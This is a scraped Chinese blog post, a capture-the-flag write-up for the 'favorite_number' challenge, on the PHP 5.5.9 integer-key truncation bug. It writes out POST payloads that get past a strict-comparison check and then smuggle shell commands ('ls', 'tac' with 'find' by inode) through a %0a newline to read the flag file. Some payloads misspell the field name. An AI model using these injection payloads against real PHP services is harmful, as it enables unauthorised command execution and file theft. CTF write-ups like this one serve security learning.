{"blogid": "124986173", "writerAge": "码龄2年", "writerBlogNum": "20", "writerCollect": "18", "writerComment": "4", "writerFan": "9", "writerGrade": "2级", "writerIntegral": "219", "writerName": "托物言志", "writerProfileAdress": "writer_image\\profile_124986173.jpg", "writerRankTotal": "87908", "writerRankWeekly": "493380", "writerThumb": "3", "writerVisitNum": "23054", "blog_read_count": "780", "blog_time": "于 2022-05-26 16:51:46 发布", "blog_title": "PHP5.5.9整数溢出漏洞", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<p>涉及内容：</p>\n<p>php的三等号，‘===’，为强等于，两边的变量的类型和值都相等，返回true；</p>\n<p>在php5.5.9中有这样的描述：</p>\n<p><a href=\"https://bugs.php.net/bug.php?id=69892\" title=\"PHP :: Bug #69892 :: Different arrays compare indentical due to integer key truncation\">PHP :: Bug #69892 :: Different arrays compare indentical due to integer key truncation</a></p>\n<p><img alt=\"\" height=\"318\" src=\"image\\fbdd225515a74206b0dab148ae7dd94b.png\" width=\"802\"/></p>\n<p>即，当数组为九位16机制数时，会溢出，等同于重新排序，16的8次方即4294967296在逻辑上等同于下标0；</p>\n<p>例：攻防世界favorite_number</p>\n<p><img alt=\"\" height=\"478\" src=\"image\\86cb9dfb08f84e68a731d17fc5ad7ab0.png\" width=\"1200\"/></p>\n<p>观察页面，第一个if，表示通过post上传的stuff值和类型必须于array一样，但是第一个又不能是admin，很明显有矛盾，则此处存在漏洞，即为上诉所说的整数溢出。</p>\n<p>打开hacker，传递post：stuff[4294967296]=admin&amp;stuff[1]=user</p>\n<p>发现可以进入一个空白界面，表明可以绕过了这个矛盾，继续往下看。</p>\n<p>大致意思就是出现sh、flag等等那些符号的话只会显示我们最喜欢的数字，很明显是防止我们直接输入命令代码，能用的基本都给ban了，因此我们的目的就是插入命令获取flag</p>\n<p>则我们通过换行符%0a进行绕过，</p>\n<p>构造：stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=114514%0als -la /</p>\n<p>但是在hacker中上传并未显示内容,(不能理解，可能对post值进行的前端的检测过滤吧)</p>\n<p>改用burp抓包绕过前端检测</p>\n<p>post传递：tuff[4294967296]=admin&amp;stuff[1]=user&amp;num=114514</p>\n<p>然后改为：tuff[4294967296]=admin&amp;stuff[1]=user&amp;num=114514%0als -la /</p>\n<p><img alt=\"\" height=\"354\" src=\"image\\ab831e7325794f83898522c090a1894d.png\" width=\"723\"/></p>\n<p> respone后发现flag，但是还ban掉了cat，flag两个关键字，</p>\n<p>所以只能更换方法</p>\n<p>抓包后改为：tuff[4294967296]=admin&amp;stuff[1]=user&amp;num=114514%0als -i /</p>\n<p><img alt=\"\" height=\"474\" src=\"image\\fd22d458c68d4021828a6a9ed7b87ae5.png\" width=\"339\"/></p>\n<p></p>\n<p>寻找到flag的inum值，复制</p>\n<p>再通过tac输出和find模式找到flag文件，进行绕过</p>\n<p>抓包后改为：tuff[4294967296]=admin&amp;stuff[1]=user&amp;num=114514%0atac `find / inum 1442561 `</p>\n<p>responce后,获取到flag</p>\n<p><img alt=\"\" height=\"253\" src=\"image\\0e19adc8d0984b53b72bec324d4090b9.png\" width=\"435\"/></p>\n<p> </p>\n<p>完毕</p>\n<p></p>\n<p> </p>\n<p></p>\n</div>\n</div>"}